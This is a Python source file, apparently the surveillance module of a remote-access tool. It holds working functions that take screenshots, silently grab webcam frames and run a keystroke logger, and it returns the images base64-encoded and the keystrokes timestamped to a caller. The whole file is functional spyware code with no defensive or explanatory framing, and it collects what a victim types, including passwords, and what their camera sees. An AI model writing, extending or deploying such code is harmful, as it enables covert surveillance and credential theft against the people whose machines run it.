import os
import base64
import logging
import tempfile
from datetime import datetime
import pyautogui
import cv2
from pynput import keyboard

# Global keylogger state
keylogger_running = False
keylogger_listener = None
captured_keys = []
MAX_KEYLOG_BUFFER = 1000  # Maximum number of keystrokes to store

def take_screenshot():
    """Take a screenshot of the current screen"""
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()
        
        # Create secure temp file
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
            temp_path = temp_file.name
            screenshot.save(temp_path)
        
        # Read and encode as base64
        with open(temp_path, "rb") as f:
            image_data = base64.b64encode(f.read()).decode()
            
        # Clean up temp file
        os.remove(temp_path)
        
        logging.info("Screenshot captured successfully")
        return {
            'status': 'success',
            'timestamp': datetime.now().isoformat(),
            'image': image_data,
            'format': 'png'
        }
    except Exception as e:
        logging.error(f"Error taking screenshot: {str(e)}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

def capture_webcam(timeout=5):
    """Capture an image from the webcam with timeout"""
    try:
        # Initialize webcam
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return {
                'status': 'error',
                'error': 'No webcam found',
                'timestamp': datetime.now().isoformat()
            }
        
        # Set timeout property
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        
        # Try to capture frame with timeout
        start_time = datetime.now()
        while (datetime.now() - start_time).seconds < timeout:
            ret, frame = cap.read()
            if ret:
                break
        
        if not ret:
            cap.release()
            return {
                'status': 'error',
                'error': f'Failed to capture image within {timeout} seconds',
                'timestamp': datetime.now().isoformat()
            }
        
        # Create secure temp file
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
            temp_path = temp_file.name
            cv2.imwrite(temp_path, frame)
        
        # Read and encode as base64
        with open(temp_path, "rb") as f:
            image_data = base64.b64encode(f.read()).decode()
            
        # Clean up
        cap.release()
        os.remove(temp_path)
        
        logging.info("Webcam image captured successfully")
        return {
            'status': 'success',
            'timestamp': datetime.now().isoformat(),
            'image': image_data,
            'format': 'jpg'
        }
    except Exception as e:
        if 'cap' in locals():
            cap.release()
        logging.error(f"Error capturing webcam: {str(e)}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

def on_key_press(key):
    """Callback for key press events"""
    global captured_keys
    try:
        key_str = str(key.char)
    except AttributeError:
        key_str = str(key)
    
    captured_keys.append({
        'key': key_str,
        'timestamp': datetime.now().isoformat()
    })
    
    # Limit buffer size
    if len(captured_keys) > MAX_KEYLOG_BUFFER:
        captured_keys = captured_keys[-MAX_KEYLOG_BUFFER:]

def start_keylogger():
    """Start the keylogger"""
    global keylogger_running, keylogger_listener
    
    if not keylogger_running:
        try:
            keylogger_listener = keyboard.Listener(on_press=on_key_press)
            keylogger_listener.start()
            keylogger_running = True
            return {
                'status': 'success',
                'message': 'Keylogger started',
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            logging.error(f"Error starting keylogger: {str(e)}")
            return {
                'status': 'error',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    else:
        return {
            'status': 'error',
            'error': 'Keylogger already running',
            'timestamp': datetime.now().isoformat()
        }

def stop_keylogger():
    """Stop the keylogger and return captured keys"""
    global keylogger_running, keylogger_listener, captured_keys
    
    if keylogger_running:
        try:
            keylogger_listener.stop()
            keylogger_running = False
            keys = captured_keys.copy()
            captured_keys = []
            return {
                'status': 'success',
                'message': 'Keylogger stopped',
                'captured_keys': keys,
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            logging.error(f"Error stopping keylogger: {str(e)}")
            return {
                'status': 'error',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
    else:
        return {
            'status': 'error',
            'error': 'Keylogger not running',
            'timestamp': datetime.now().isoformat()
        }

def is_keylogger_running():
    """Check if keylogger is running"""
    return keylogger_running 